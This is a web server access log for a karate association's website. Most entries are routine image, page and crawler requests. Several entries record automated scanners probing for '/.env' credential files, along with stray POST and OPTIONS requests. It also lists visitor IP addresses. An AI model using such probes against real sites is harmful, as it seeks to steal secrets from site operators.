::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/tm.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/bobook.gif HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:29 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:166.205.91.37 - - [26/Jul/2022:01:06:33 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:06:50 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:07:15 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:07:25 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:192.241.219.172 - - [26/Jul/2022:01:07:36 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:98.51.143.96 - - [26/Jul/2022:01:08:04 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:08:08 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:08:18 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:08:25 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:08:32 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:08:43 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:08:50 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:13:11 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:13:21 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:13:28 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:13:35 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:13:46 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:157.55.39.140 - - [26/Jul/2022:01:14:49 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:40.77.191.250 - - [26/Jul/2022:01:14:54 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
::ffff:98.51.143.96 - - [26/Jul/2022:01:17:00 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:17:07 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:17:14 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:19:37 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:19:44 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:20:09 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:20:23 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:98.51.143.96 - - [26/Jul/2022:01:20:34 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:185.254.196.115 - - [26/Jul/2022:01:32:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [26/Jul/2022:01:32:43 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:01:35:18 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:01:38:15 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:66.249.79.165 - - [26/Jul/2022:01:38:15 +0000] "GET /locations.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:73.202.170.82 - - [26/Jul/2022:01:41:09 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:205.210.31.23 - - [26/Jul/2022:01:43:12 +0000] "GET / HTTP/1.1" 200 57618 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:73.202.170.82 - - [26/Jul/2022:01:44:23 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:157.55.39.140 - - [26/Jul/2022:01:46:12 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:40.77.139.105 - - [26/Jul/2022:01:46:22 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
::ffff:73.202.170.82 - - [26/Jul/2022:01:47:07 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:01:50:24 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:01:53:01 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:01:56:16 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:01:59:12 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:143.92.32.49 - - [26/Jul/2022:02:01:38 +0000] "GET /map/baidumap.xml HTTP/1.1" 404 155 "/map/baidumap.xml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:02:02:12 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:135.125.246.110 - - [26/Jul/2022:02:03:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [26/Jul/2022:02:03:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:181.214.206.161 - - [26/Jul/2022:02:03:53 +0000] "OPTIONS / HTTP/1.1" 200 8 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:02:05:12 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:40.77.167.41 - - [26/Jul/2022:02:05:28 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.202.170.82 - - [26/Jul/2022:02:08:05 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:02:11:11 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:109.237.103.9 - - [26/Jul/2022:02:11:48 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:02:14:12 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:02:17:15 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:02:20:06 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:02:23:15 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:02:26:09 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:10 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:10 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:11 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:11 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:11 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:11 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:11 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:11 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:12 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:12 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:12 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:12 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:12 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:12 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:12 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:12 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:13 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:14 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [26/Jul/2022:02:27:15 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
